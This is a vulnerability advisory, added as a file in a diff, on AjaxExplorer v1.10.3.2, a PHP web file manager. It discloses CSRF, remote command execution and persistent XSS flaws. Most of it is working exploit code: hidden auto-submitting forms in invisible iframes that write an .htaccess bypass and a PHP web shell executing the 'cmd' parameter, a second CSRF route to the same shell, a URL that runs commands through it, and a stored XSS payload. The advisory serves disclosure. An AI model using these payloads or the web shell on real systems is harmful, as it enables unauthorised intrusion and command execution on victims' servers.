@@ -1,0 +1,177 @@
+[+] Credits: hyp3rlinx
+
+[+] Website: hyp3rlinx.altervista.org
+
+[+] Source:
+http://hyp3rlinx.altervista.org/advisories/AJAXEXPLORER-REMOTE-CMD-EXECUTION.txt
+
+[+] ISR: apparitionsec
+
+
+Vendor:
+==========
+sourceforge.net
+smsid
+
+download linx:
+sourceforge.net/projects/ajax-explorer/files/
+
+
+Product:
+=======================
+AjaxExplorer v1.10.3.2
+
+Manage server files through simple windows like interface.
+
+
+Vulnerability Type:
+=======================
+Remote Command Execution
+CSRF
+Persistent XSS
+
+
+CVE Reference:
+==============
+N/A
+
+
+Vulnerability Details:
+=====================
+
+AjaxExplorer has command terminal feature where you can move, copy, delete
+files etc... also lets a user save commands in a
+flat file named "terminal" under their user profile
+"/ae.user/owner/myprofile".
+
+e.g.
+
+copy [FILEPATH + FILENAME] [FILEPATH]
+create [FILEPATH + FILENAME]
+
+Since AjaxExplorer also suffers from CSRF vulnerability we can exploit the
+application by first creating an .htaccess file with an
+"allow from all" directive to bypass access restrictions, next create
+arbitrary PHP files for remote command execution purposes.
+This exploit will require two consecutive HTTP requests, so we need to
+target an iframe to stay on same page until exploit is completed.
+
+
+Exploit code(s):
+===============
+
+1) first POST request creates .htaccess file so we can bypass directory
+browsing restrictions.
+2) second POST writes our remote command execution file we will then access
+to execute commands on the victim system.
+
+The below P:/ for "strPath" form value is for "Profile"
+
+
+<iframe name="PWNED" style="display:none" name="hidden-form"></iframe>
+
+<form target="PWNED" id="htaccess" action="
+http://localhost/AjaxExplorer%201.10.3.2/ajaxexplorer/index.php"
+method="post">
+<input type="hidden" name="strPage" value="control/file/editor" >
+<input type="hidden" name="strPath" value="P:/" >
+<input type="hidden" name="strFile" value=".htaccess" >
+<input type="hidden" name="strText" value='allow from all' >
+<script>document.getElementById('htaccess').submit()</script>
+</form>
+
+<form target="PWNED" id="RCE" action="
+http://localhost/AjaxExplorer%201.10.3.2/ajaxexplorer/index.php"
+method="post">
+<input type="hidden" name="strPage" value="control/file/editor" >
+<input type="hidden" name="strPath" value="P:/" >
+<input type="hidden" name="strFile" value="terminal.php" >
+<input type="hidden" name="strText" value='<?php exec($_GET["cmd"]);?>' >
+<script>document.getElementById('RCE').submit()</script>
+</form>
+
+Now we can access and run arbitrary cmds.
+
+http://localhost/AjaxExplorer%201.10.3.2/ajaxexplorer/ae.user/owner/myprofile/terminal.php?cmd=c
+:\\Windows\\system32\\calc.exe
+
+
+/////////////////////////////////////////////////////
+
+
+Here is another way to RCE this application... first create PHP file then
+edit.
+
+<iframe name="DOOM" style="display:none" name="hidden-form"></iframe>
+
+<form target="DOOM" id="CSRF2" method="post" action="
+http://localhost/AjaxExplorer%201.10.3.2/ajaxexplorer/index.php">
+<input type="hidden" name="strPage" value="control/file/editor" />
+<input type="hidden" name="strPath" value="D:/" />
+<input type="hidden" name="strFile" value="PWNED.php" />
+<input type="hidden" name="strText"
+value="<?php%20exec($_GET['cmd']);%20?>" />
+</form>
+
+<form target="DOOM" id="CSRF1" method="post" action="
+http://localhost/AjaxExplorer%201.10.3.2/ajaxexplorer/index.php">
+<input type="hidden" name="strPage" value="control/file/create" />
+<input type="hidden" name="strPath" value="D:/" />
+<input type="hidden" name="strFile" value="D:/PWNED.php" />
+<script>
+document.getElementById('CSRF1').submit()
+document.getElementById('CSRF2').submit()
+</script>
+</form>
+
+
+////////////////////////
+
+Persistent XSS:
+================
+
+We can also write persistent XSS payload to the user profile "terminal"
+file.
+
+<form id="XSS" method="post" action="
+http://localhost/AjaxExplorer%201.10.3.2/ajaxexplorer/index.php">
+<input type="hidden" name="strPage" value="control/file/editor" />
+<input type="hidden" name="strPath" value="P:/" />
+<input type="hidden" name="strFile" value="terminal" />
+<input type="hidden" name="strText" value="<script>alert(666)</script>" />
+<script>document.getElementById('XSS').submit()</script>
+</form>
+
+
+
+Disclosure Timeline:
+===============================
+Vendor Notification:  NA
+June 1, 2016  : Public Disclosure
+
+
+Exploitation Technique:
+=======================
+Remote
+
+
+Severity Level:
+================
+8.0 (High)
+CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:N
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no
+warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory,
+provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in
+vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the
+information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author
+prohibits any malicious use of security related information
+or exploits by the author or elsewhere.
+
+hyp3rlinx
